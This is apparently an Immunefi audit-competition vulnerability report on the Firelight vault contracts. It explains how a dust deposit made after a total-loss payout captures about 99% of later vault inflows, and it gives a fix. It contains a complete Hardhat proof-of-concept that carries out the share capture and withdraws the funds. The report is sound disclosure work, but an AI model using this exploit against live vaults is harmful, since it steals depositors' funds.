# 90025 sc medium a dust deposit after a total loss payout captures approximately 99 of all future vault inflows

**Submitted on Aug 22nd 2026 at 14:41:56 UTC by @nemveer for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight-1)

* **Report ID:** #90025
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-firelight/blob/v1\\_audit\\_ready/contracts/core/FirelightVault.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

### Description

`FirelightVault` represents depositor ownership through ERC-4626 shares. Incident payouts reduce the vault’s assets, while premiums, incentives, and recapitalization subsequently replenish the vault for the benefit of its existing shareholders.

A valid incident payout can reduce `totalAssets()` to exactly zero without reducing `totalSupply()`. The payout updates the asset checkpoint and transfers the underlying assets, but it does not burn outstanding shares:

```solidity
_traceTotalAssets.push(
    Time.timestamp(),
    currentActiveAssets - paidFromActive
);

IERC20(asset()).safeTransfer(to, paidAmount);
```

[`FirelightVault.sol#L927-L965`](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L927-L965)

After a complete loss, the vault can therefore enter the following valid state:

```
totalAssets() = 0
totalSupply() = S > 0
```

The vault does not override `_decimalsOffset()`, leaving it at OpenZeppelin’s default value of zero. Its share conversion consequently uses one virtual asset and one virtual share:

```solidity
return assets.mulDiv(
    totSupply + 10 ** _decimalsOffset(),
    totAssets + 1,
    rounding
);
```

[`FirelightVault.sol#L1058-L1065`](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L1058-L1065)

At zero assets, this becomes:

```
sharesMinted = depositedAssets × (totalSupply + 1)
```

An attacker depositing `d` asset units receives `d × (S + 1)` shares. The attacker’s resulting ownership fraction is approximately:

```
d(S + 1) / (S + d(S + 1)) ≈ d / (d + 1)
```

| Dust deposit | Approximate attacker ownership |
| -----------: | -----------------------------: |
|       1 unit |                            50% |
|     10 units |                         90.91% |
|    100 units |                         99.01% |
|  1,000 units |                         99.90% |

A deposit of only 100 smallest asset units therefore gives the attacker approximately 99.01% of the vault’s total share supply.

The deposit is accepted because the existing protection only rejects deposits that mint zero shares:

```solidity
if (shares == 0) revert InvalidAmount();
```

[`FirelightVault.sol#L646-L673`](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L646-L673)

In the vulnerable state, the attacker receives an extremely large number of shares rather than zero, so this check provides no protection.

The incident gate also does not permanently prevent exploitation. Once the final incident for the period closes, `IncidentManager` clears the active-incident flag and deposits reopen:

```solidity
if (count == 0) {
    $.vault.setActiveIncident(period, false);
}
```

[`IncidentManager.sol#L817-L830`](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/IncidentManager.sol#L817-L830)

After the attacker captures the share supply, `VaultRewardDistributor` transfers premiums and incentives directly into the vault and checkpoints the increased balance without minting corresponding shares:

```solidity
$.vaultAsset.safeTransferFrom(
    msg.sender,
    address(_vault),
    vaultAssetAmount
);

_vault.checkpointTotalAssets();
```

[`VaultRewardDistributor.sol#L132-L152`](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/VaultRewardDistributor.sol#L132-L152)

[`VaultRewardDistributor.sol#L163-L176`](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/VaultRewardDistributor.sol#L163-L176)

Approximately 99% of every subsequent premium distribution, incentive, recapitalization, or other no-share inflow consequently accrues to the attacker.

The broken invariant is that a depositor’s ownership increase must remain proportional to the assets they contribute. When `totalAssets() == 0 && totalSupply() > 0`, a negligible deposit instead acquires almost the entire share supply.

The attack requires the vault to reach zero assets while retaining a nonzero share supply. This can occur through a legitimate, correctly processed total-loss incident and does not require any role holder to act maliciously or exceed their authority. Once that state exists and the incident closes, the share-capture transaction is fully permissionless.

#### Concrete example

* Assume the vault initially has:

```
Assets: 1,000,000 FXRP
Shares: 1,000,000 shares
```

* A correctly approved total-loss incident pays all assets:

```
Assets after payout: 0
Shares after payout: 1,000,000
```

* An attacker deposits 100 smallest asset units:

```
Attacker shares:
100 × (1,000,000 + 1)
= 100,000,100
Resulting total supply:
101,000,100 shares
Attacker fraction:
100,000,100 / 101,000,100
≈ 99.0099%
```

* If the protocol subsequently forwards 1,000,000 FXRP as recapitalization, approximately 990,099 FXRP belongs to the attacker’s shares.

#### Impact

An unprivileged account can capture nearly all:

* Future premium distributions.
* Incentive distributions.
* Operator recapitalization.
* Other direct inflows into the vault.
* Residual recovery value intended for pre-loss LPs.

**Fix:** revert `deposit`/`mint` when `totalAssets() == 0 && totalSupply() > 0`; and mint shares (or gate on the same condition) in `VaultRewardDistributor`.

## Proof of Concept

## Proof of Concept

```
/**
 * PoC: zero-asset vault share capture
 *
 * A legitimate total-loss payout drives FirelightVault.totalAssets() to zero
 * WITHOUT burning any vault shares. ERC-4626 virtual-share conversion in that
 * state is
 *
 *     shares = assets * (totalSupply + 1) / (totalAssets + 1)
 *            = assets * (totalSupply + 1)          // totalAssets == 0
 *
 * so a permissionless dust deposit of `d` units mints d * (S + 1) shares and
 * captures ~d/(d+1) of the resulting supply. Every later inflow that adds
 * assets without minting shares (premiums / incentives / recapitalisation via
 * VaultRewardDistributor) then accrues to the attacker pro rata.
 *
 * No privileged actor misbehaves: the incident, the payout and the incident
 * closure all follow the intended workflow.
 */
const { loadFixture, time } = require('@nomicfoundation/hardhat-network-helpers')
const { ethers, upgrades } = require('hardhat')
const { deployVault } = require('./setup/fixtures.js')
const { expect } = require('chai')

const DECIMALS = 6
const UNIT = 10n ** BigInt(DECIMALS)
const LP_DEPOSIT = 1_000_000n * UNIT // 1,000,000 fXRP honest liquidity
const RECAP = 1_000_000n * UNIT // 1,000,000 fXRP forwarded after the loss
const DUST = 100n // 100 smallest asset units
const DEPOSIT_LIMIT = 10_000_000n * UNIT

const BPS = 10_000n
const bps = (part, whole) => (whole === 0n ? 0n : (part * BPS) / whole)

const baseVault = () =>
  loadFixture(
    deployVault.bind(null, {
      decimals: DECIMALS,
      initial_deposit_limit: DEPOSIT_LIMIT.toString(),
    }),
  )

/** Deploys VaultRewardDistributor against the real vault and wires up its roles. */
async function deployDistributor(ctx) {
  const { firelight_vault, deployer } = ctx
  const distributorSigner = ctx.users[2]

  const Factory = await ethers.getContractFactory('VaultRewardDistributor')
  const distributor = await upgrades.deployProxy(Factory, [
    firelight_vault.target,
    deployer.address,
    distributorSigner.address,
    ethers.ZeroAddress,
  ])

  // distributeRewards/distributeIncentive checkpoint the vault atomically.
  await firelight_vault
    .connect(deployer)
    .grantRole(await firelight_vault.CHECKPOINT_ROLE(), await distributor.getAddress())

  return { distributor, distributorSigner }
}

describe('PoC: zero-asset vault share capture', function () {
  it('lets a 100-unit deposit after a total-loss payout capture ~99% of the vault', async () => {
    const ctx = await baseVault()
    const { token_contract, firelight_vault, payout_signer, payout_receiver, incident, utils, config } = ctx

    const lp = ctx.users[0]
    const attacker = ctx.users[1]

    // ---------------------------------------------------------------------
    // STEP 1 - honest LP creates a non-zero share supply.
    // ---------------------------------------------------------------------
    await utils.mintAndApprove(LP_DEPOSIT, lp)
    await firelight_vault.connect(lp).deposit(LP_DEPOSIT, lp.address)

    const supplyBeforePayout = await firelight_vault.totalSupply()
    expect(await firelight_vault.totalAssets()).to.equal(LP_DEPOSIT)
    expect(supplyBeforePayout).to.be.gt(0n)

    // ---------------------------------------------------------------------
    // STEP 2 - a genuine covered loss: incident opened, then paid out in full.
    // ---------------------------------------------------------------------
    await time.increase(config.period_configuration_duration)

    const capturePeriod = await firelight_vault.currentPeriod()
    const captureTimestamp = await firelight_vault.currentPeriodStart()

    await firelight_vault.connect(incident).setActiveIncident(capturePeriod, true)

    // Deposits are correctly blocked while the incident is open.
    await utils.mintAndApprove(DUST, attacker)
    await expect(
      firelight_vault.connect(attacker).deposit(DUST, attacker.address),
    ).to.be.revertedWithCustomError(firelight_vault, 'CurrentPeriodHasActiveIncident')

    await firelight_vault.connect(payout_signer).payout(payout_receiver.address, LP_DEPOSIT, captureTimestamp)

    // STEP 3 - assets are zero, but the share supply was NOT reduced.
    expect(await firelight_vault.totalAssets()).to.equal(0n)
    expect(await token_contract.balanceOf(firelight_vault.target)).to.equal(0n)
    expect(await firelight_vault.totalSupply()).to.equal(supplyBeforePayout)
    expect(await token_contract.balanceOf(payout_receiver.address)).to.equal(LP_DEPOSIT)

    // ---------------------------------------------------------------------
    // STEP 4 - the incident closes normally; deposits reopen.
    // (IncidentManager calls exactly this once its last open incident closes.)
    // ---------------------------------------------------------------------
    await firelight_vault.connect(incident).setActiveIncident(capturePeriod, false)
    expect(await firelight_vault.maxDeposit(attacker.address)).to.be.gt(0n)

    // ---------------------------------------------------------------------
    // STEP 5 - permissionless 100-unit deposit.
    // The `shares == 0` dust guard does not fire: at totalAssets == 0 the
    // conversion explodes upward instead of flooring to zero.
    // ---------------------------------------------------------------------
    await firelight_vault.connect(attacker).deposit(DUST, attacker.address)

    const attackerShares = await firelight_vault.balanceOf(attacker.address)
    const totalSupplyAfter = await firelight_vault.totalSupply()

    // shares minted == DUST * (S + 1)
    expect(attackerShares).to.equal(DUST * (supplyBeforePayout + 1n))

    // STEP 6 - attacker owns ~99.01% of the supply for 100 units of asset.
    const ownershipBps = bps(attackerShares, totalSupplyAfter)
    expect(ownershipBps).to.be.gte(9_900n) // >= 99.00%
    console.log(
      `        attacker paid ${DUST} units and owns ${Number(ownershipBps) / 100}% of supply`,
    )

    // ---------------------------------------------------------------------
    // STEP 7 - protocol recapitalises the vault through VaultRewardDistributor.
    // The transfer mints no shares, so it accrues pro rata to the attacker.
    // ---------------------------------------------------------------------
    const { distributor, distributorSigner } = await deployDistributor(ctx)
    await utils.mintAndApprove(RECAP, distributorSigner)
    await token_contract.connect(distributorSigner).approve(await distributor.getAddress(), RECAP)
    await distributor
      .connect(distributorSigner)
      .distributeIncentive(RECAP, ethers.encodeBytes32String('recap'))

    expect(await firelight_vault.totalAssets()).to.equal(RECAP + DUST)

    const attackerClaim = await firelight_vault.maxWithdraw(attacker.address)
    const lpClaim = await firelight_vault.maxWithdraw(lp.address)

    console.log(
      `        of ${RECAP / UNIT} fXRP recapitalisation: attacker claim ${attackerClaim / UNIT} fXRP, ` +
        `original LP claim ${lpClaim / UNIT} fXRP`,
    )

    expect(bps(attackerClaim, RECAP)).to.be.gte(9_900n) // attacker >= 99% of the recap
    expect(bps(lpClaim, RECAP)).to.be.lte(101n) // pre-loss LP <= ~1%

    // ---------------------------------------------------------------------
    // STEP 8 - the attacker actually walks away with the assets.
    // ---------------------------------------------------------------------
    const attackerBalanceBefore = await token_contract.balanceOf(attacker.address)

    const withdrawPeriod = (await firelight_vault.currentPeriod()) + 1n
    await firelight_vault.connect(attacker).redeem(attackerShares, attacker.address, attacker.address)

    // withdrawals become claimable once the assigned period has ended
    await time.increase(config.period_configuration_duration * 2)
    await firelight_vault.connect(attacker).claimWithdraw(withdrawPeriod)

    const realised = (await token_contract.balanceOf(attacker.address)) - attackerBalanceBefore
    console.log(`        attacker realised ${realised / UNIT} fXRP of stolen assets`)

    expect(realised).to.be.gt(DUST)
    expect(bps(realised, RECAP)).to.be.gte(9_900n)
    // profit is ~99% of the recapitalisation, net of the 100-unit deposit
    expect(realised - DUST).to.be.gte((RECAP * 99n) / 100n)
  })

  it('control: the same 100-unit deposit captures nothing in a healthy vault', async () => {
    const ctx = await baseVault()
    const { token_contract, firelight_vault, utils } = ctx

    const lp = ctx.users[0]
    const attacker = ctx.users[1]

    await utils.mintAndApprove(LP_DEPOSIT, lp)
    await firelight_vault.connect(lp).deposit(LP_DEPOSIT, lp.address)

    await utils.mintAndApprove(DUST, attacker)
    await firelight_vault.connect(attacker).deposit(DUST, attacker.address)

    const attackerShares = await firelight_vault.balanceOf(attacker.address)
    const ownershipBps = bps(attackerShares, await firelight_vault.totalSupply())

    // ~0.00001% instead of ~99%
    expect(ownershipBps).to.equal(0n)
    expect(attackerShares).to.equal(DUST)

    const { distributor, distributorSigner } = await deployDistributor(ctx)
    await utils.mintAndApprove(RECAP, distributorSigner)
    await token_contract.connect(distributorSigner).approve(await distributor.getAddress(), RECAP)
    await distributor
      .connect(distributorSigner)
      .distributeIncentive(RECAP, ethers.encodeBytes32String('recap'))

    const attackerClaim = await firelight_vault.maxWithdraw(attacker.address)
    // the dust depositor captures a negligible slice of the same inflow
    expect(attackerClaim).to.be.lt(DUST * 10n)
    expect(bps(attackerClaim, RECAP)).to.equal(0n)
  })
})

```
